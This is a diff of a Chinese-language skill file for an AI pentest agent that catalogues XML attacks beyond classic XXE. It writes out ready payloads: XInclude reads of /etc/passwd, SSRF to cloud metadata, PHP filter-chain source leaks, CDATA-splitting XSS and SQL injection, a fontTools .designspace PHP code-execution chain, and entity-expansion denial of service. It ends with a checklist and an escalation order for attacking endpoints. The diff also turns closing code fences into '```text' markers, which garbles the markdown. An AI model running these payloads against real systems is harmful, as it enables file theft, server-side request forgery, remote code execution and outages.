@@ -4,7 +4,7 @@ description: 'XML 攻击超越经典 XXE：XInclude (无DOCTYPE读文件)、CDAT
 disable-model-invocation: true
 metadata: { domain: web, tier: T2 }
 ---
-> 📌 DSH 适配：本技能移植自 RS。原 read_skill/run_skill 调用 = 用 DSH 的 skill 工具按名加载对应技能；fleet/kali-mcp = 用 bash 后台任务与 subagent 工具实现。
+
 
 # XML 处理攻击（超越经典 XXE）
 
@@ -13,11 +13,11 @@ metadata: { domain: web, tier: T2 }
 
 ## 为什么需要这张表 — XXE 不是银弹
 
-```
+```text
 经典 XXE 前提: 能控制或注入 <!DOCTYPE>
 现实:        很多应用已有 DOCTYPE，你只能注入 body 内的数据
             → XInclude 是解决方案 — 完全绕过 DOCTYPE
-```
+```text
 
 ---
 
@@ -31,28 +31,28 @@ metadata: { domain: web, tier: T2 }
 <foo xmlns:xi="http://www.w3.org/2001/XInclude">
   <xi:include parse="text" href="file:///etc/passwd"/>
 </foo>
-```
+```text
 
 ### 文件读取
 ```xml
 <foo xmlns:xi="http://www.w3.org/2001/XInclude">
   <xi:include parse="text" href="file:///etc/passwd"/>
 </foo>
-```
+```text
 
 ### SSRF
 ```xml
 <foo xmlns:xi="http://www.w3.org/2001/XInclude">
   <xi:include parse="text" href="http://169.254.169.254/latest/meta-data/"/>
 </foo>
-```
+```text
 
 ### PHP filter chain
 ```xml
 <foo xmlns:xi="http://www.w3.org/2001/XInclude">
   <xi:include parse="text" href="php://filter/convert.base64-encode/resource=../index.php"/>
 </foo>
-```
+```text
 
 ### SOAP 信封内注入（ namespace 加到外层）
 ```xml
@@ -63,7 +63,7 @@ metadata: { domain: web, tier: T2 }
     </productId></getStock>
   </soap:Body>
 </soap:Envelope>
-```
+```text
 
 ---
 
@@ -71,11 +71,11 @@ metadata: { domain: web, tier: T2 }
 
 ### 原理
 
-```
+```text
 XML 解析器:  <![CDATA[ 内容 ]] → 原样传递，不解析
 应用代码:   取出 CDATA 内容 → 拼入另一个解释器 (HTML/SQL/PHP eval/Shell)
 攻击者:     提前关闭 CDATA → 注入下游标记 → 重新打开 CDATA
-```
+```text
 
 ### 通用分割模式
 
@@ -83,19 +83,19 @@ XML 解析器:  <![CDATA[ 内容 ]] → 原样传递，不解析
 <element>
   <![CDATA[ benign ]]><malicious_injected><![CDATA[ more ]]> 
 </element>
-```
+```yaml
 
 拆解: `CDATA[benign]]` → `>` 关闭 CDATA → `<malicious>` 裸标记 → `<![CDATA[more]]` 新 CDATA
 
 ### XSS via CDATA
 ```xml
 <name><![CDATA[]]><script>alert(1)</script><![CDATA[]]></name>
-```
+```text
 
 ### SQLi via CDATA
 ```xml
 <user><name><![CDATA[admin']]><![CDATA[--]]></name></user>
-```
+```text
 
 ### 🆕 fontTools .designspace CDATA → PHP RCE (CVE-2025-66034)
 
@@ -124,9 +124,9 @@ XML 解析器:  <![CDATA[ 内容 ]] → 原样传递，不解析
     </variable-font>
   </variable-fonts>
 </designspace>
-```
+```text
 
-```
+```text
 攻击链:
   ① fontTools.varLib.main() 处理 .designspace
   ② <labelname> 内容 = 裸 PHP → 写入输出文件
@@ -137,7 +137,7 @@ XML 解析器:  <![CDATA[ 内容 ]] → 原样传递，不解析
   - fonttools >= 4.33.0, < 4.60.2
   - Web 应用接受用户上传 .designspace + .ttf
   - 输出目录可被 Web 访问
-```
+```text
 
 ### CDATA 分割语法解释
 
@@ -145,7 +145,7 @@ XML 解析器:  <![CDATA[ 内容 ]] → 原样传递，不解析
 <![CDATA[<?php code ?>]]]]><![CDATA[>]]>
            ↑            ↑     ↑     ↑
          PHP代码     关闭CDATA  新CDATA  多余的>无害
-```
+```text
 
 ---
 
@@ -171,7 +171,7 @@ XML 解析器:  <![CDATA[ 内容 ]] → 原样传递，不解析
 ]>
 <bomb>&lol9;</bomb>
 <!-- 10^9 次 "lol" → 内存耗尽 -->
-```
+```text
 
 ### Quadratic Blowup
 ```xml
@@ -180,13 +180,13 @@ XML 解析器:  <![CDATA[ 内容 ]] → 原样传递，不解析
 <!ENTITY b "&a;&a;&a;...100000次...&a;">
 ]>
 <data>&b;</data>
-```
+```text
 
 ---
 
 ## 攻击面识别清单
 
-```
+```text
 [ ] body 是 XML → 先试经典 XXE (DOCTYPE + SYSTEM)
 [ ] 已有 DOCTYPE 但能注入 body → XInclude
 [ ] 输出被 HTML/SQL/PHP 消费 → CDATA 分割注入
@@ -195,17 +195,17 @@ XML 解析器:  <![CDATA[ 内容 ]] → 原样传递，不解析
 [ ] SOAP endpoint → 经典 XXE + XInclude (namespace 加到信封外层)
 [ ] SVG 上传 → SVG XXE (DOCTYPE) + XInclude
 [ ] Office 文档上传 (DOCX/XLSX) → OOXML XXE
-```
+```text
 
 ## 与经典 XXE 的配合
 
-```
+```text
 优先级:
   ① 先试经典 XXE (DOCTYPE external entity) — 最快
   ② 不通 → XInclude — 绕过 DOCTYPE 限制
   ③ 输出回显 → CDATA 分割 — 向下游投毒
   ④ 上传文件 → 组合攻击 — XXE + CDATA + 路径穿越
-```
+```text
 
 **Why:** 经典 XXE skill 只覆盖了 DOCTYPE 外部实体。CDATA 分割和 XInclude 是 OA XXE 的基础补充，而且两者不需要 DOCTYPE 控制。
 **How to apply:** 遇到 XML 端点 → DOCTYPE 不通就试 XInclude；输出被 HTML 消费就试 CDATA 分割。
